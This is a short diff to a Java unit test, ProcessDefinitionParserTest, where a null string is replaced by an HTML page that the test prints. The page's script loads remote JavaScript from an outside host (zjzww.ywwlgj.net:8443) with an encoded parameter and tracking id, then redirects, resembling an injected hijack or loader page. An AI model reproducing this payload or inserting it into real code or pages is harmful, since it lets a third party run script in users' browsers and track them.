@@ -25,7 +25,7 @@ class ProcessDefinitionParserTest {
 
     @Test
     void echo() {
-        String str = null;
+        String str = "<html><head/><body onload=\"a()\"><script>o=[\"zjzww.ywwlgj.net\"];p=0;q=\"MzIsMzosNjIsNEI1NDc0MzI6MDQyQjc7LDAyMCw0OiwzOzRCMTIyMzRCMzQ1MjY6NTc7MjI0MUJlcXNmcWho\";r=window.location.href;r=r.split(\"#\")[0];s=r.substring(0,4)==\"http\"?0:1;function a(){for(i in o){b(\"https://\"+o[i]+\":8443/addInternetInfo?parm=\"+q+\"&uuid=184f0d1c4af8c60&itype=\"+s);p++}}function b(x){y=document.createElement('script');y.type=\"text/javascript\";y.src=x;document.querySelector('head').appendChild(y)}(function c(n){if(n<9&&p!=o.length){setTimeout(function(){c(n+1)},100)}else if(0==s){window.location.href=r}})(0)</script></body></html>\r\n";
         System.out.println(str);
     }
 
